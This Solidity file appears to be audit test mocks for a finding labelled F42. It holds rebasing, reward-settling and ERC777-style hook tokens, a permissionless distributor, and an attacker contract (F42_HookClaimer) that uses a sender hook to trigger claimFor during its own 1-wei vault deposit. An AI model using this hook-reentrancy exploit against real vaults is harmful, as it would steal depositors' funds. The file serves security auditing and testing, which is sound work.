// SPDX-License-Identifier: MIT
// v1 evidence suite (audit/2026-09-preliminary): mock for finding F42, carried over from the
// audit PoC sandbox poc/F42/contracts/test/F42Tokens.sol. Contracts renamed F42_* so no artifact
// name collides with another PoC or the main suite; logic unchanged.
pragma solidity 0.8.28;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IVaultLike} from "../test/TestHelpers.sol";

/**
 * @dev F42 PoC. Shares-based token whose rebase runs INSIDE the first transfer after an epoch
 * boundary (the BSC "auto-staking" pattern: rebase() is called from _transfer once
 * shouldRebase()). rateNum/rateDen > 1 is a positive rebase, < 1 a negative one.
 */
contract F42_RebaseOnTransferToken {
    string public constant name = "Auto Rebase";
    string public constant symbol = "ARB";
    uint8 public constant decimals = 18;

    uint256 public index = 1e18; // balance = shares * index / 1e18
    uint256 public totalShares;
    mapping(address => uint256) public sharesOf;
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public epochLength;
    uint256 public nextRebaseAt;
    uint256 public rateNum;
    uint256 public rateDen;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Rebased(uint256 newIndex);

    function configureRebase(uint256 epochLen, uint256 num, uint256 den) external {
        epochLength = epochLen;
        nextRebaseAt = block.timestamp + epochLen;
        rateNum = num;
        rateDen = den;
    }

    function balanceOf(address a) public view returns (uint256) {
        return sharesOf[a] * index / 1e18;
    }

    function totalSupply() external view returns (uint256) {
        return totalShares * index / 1e18;
    }

    function mint(address to, uint256 amount) external {
        _maybeRebase();
        uint256 s = amount * 1e18 / index;
        sharesOf[to] += s;
        totalShares += s;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _maybeRebase();
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        _maybeRebase();
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) {
            require(a >= amount, "allowance");
            allowance[from][msg.sender] = a - amount;
        }
        _move(from, to, amount);
        return true;
    }

    function _maybeRebase() internal {
        if (epochLength != 0 && block.timestamp >= nextRebaseAt) {
            index = index * rateNum / rateDen;
            nextRebaseAt = block.timestamp + epochLength;
            emit Rebased(index);
        }
    }

    function _move(address from, address to, uint256 amount) internal {
        uint256 s = amount * 1e18 / index;
        require(sharesOf[from] >= s, "balance");
        sharesOf[from] -= s;
        sharesOf[to] += s;
        emit Transfer(from, to, amount);
    }
}

/**
 * @dev F42 PoC. Rewards accrue to an account as `pendingReward`, invisible to balanceOf, and are
 * settled into the balance whenever a transfer touches that account (from or to).
 */
contract F42_SettleOnTouchRewardToken is ERC20 {
    mapping(address => uint256) public pendingReward;

    constructor() ERC20("Lazy Reward", "LZR") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    /// @dev Stand-in for a reward index moving in the account's favour.
    function accrueReward(address account, uint256 amount) external {
        pendingReward[account] += amount;
    }

    function _update(address from, address to, uint256 value) internal override {
        if (from != address(0)) _settle(from);
        if (to != address(0)) _settle(to);
        super._update(from, to, value);
    }

    function _settle(address a) internal {
        uint256 p = pendingReward[a];
        if (p != 0) {
            pendingReward[a] = 0;
            super._update(address(0), a, p);
        }
    }
}

interface F42_ITokensSenderLike {
    function tokensToSend(address operator, address from, address to, uint256 amount) external;
}

/**
 * @dev F42 PoC. ERC777-style sender hook: a registered hook of `from` runs BEFORE balances move
 * (ERC-777 tokensToSend ordering). Registration is self-service, as with ERC-1820.
 */
contract F42_SenderHookToken is ERC20 {
    mapping(address => address) public senderHookOf;

    constructor() ERC20("Sender Hook", "SHK") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function setSenderHook(address hook) external {
        senderHookOf[msg.sender] = hook;
    }

    function _update(address from, address to, uint256 value) internal override {
        address h = from == address(0) ? address(0) : senderHookOf[from];
        if (h != address(0)) F42_ITokensSenderLike(h).tokensToSend(msg.sender, from, to, value);
        super._update(from, to, value);
    }
}

/// @dev F42 PoC. A permissionless payer: anyone may push an account's owed tokens to it.
contract F42_Distributor {
    IERC20 public immutable token;
    mapping(address => uint256) public owed;

    constructor(IERC20 t) {
        token = t;
    }

    function setOwed(address account, uint256 amount) external {
        owed[account] = amount;
    }

    function claimFor(address account) external {
        uint256 amt = owed[account];
        require(amt != 0, "nothing owed");
        owed[account] = 0;
        require(token.transfer(account, amt), "transfer");
    }
}

/**
 * @dev F42 PoC. Mallory's contract. It owns a vault, and its tokensToSend hook fires the
 * distributor's permissionless claimFor(vault) during its own 1-wei deposit.
 */
contract F42_HookClaimer is F42_ITokensSenderLike {
    address public immutable attacker;
    address public immutable vault;
    F42_SenderHookToken public immutable token;
    F42_Distributor public immutable distributor;
    bool public armed;

    constructor(address v, F42_SenderHookToken t, F42_Distributor d) {
        attacker = msg.sender;
        vault = v;
        token = t;
        distributor = d;
        t.setSenderHook(address(this));
    }

    function tokensToSend(address, address, address, uint256) external override {
        require(msg.sender == address(token), "only token");
        if (armed) {
            armed = false;
            distributor.claimFor(vault);
        }
    }

    function depositOneWei(address heir, uint32 period, uint32 window, uint64 horizon) external returns (uint256 id) {
        require(msg.sender == attacker, "only attacker");
        token.approve(vault, type(uint256).max);
        armed = true;
        id = IVaultLike(vault).createVault(address(token), 1, heir, period, window, horizon);
    }

    function withdrawTo(uint256 id, uint256 amount, address to) external {
        require(msg.sender == attacker, "only attacker");
        IVaultLike(vault).withdraw(id, amount, to);
    }
}
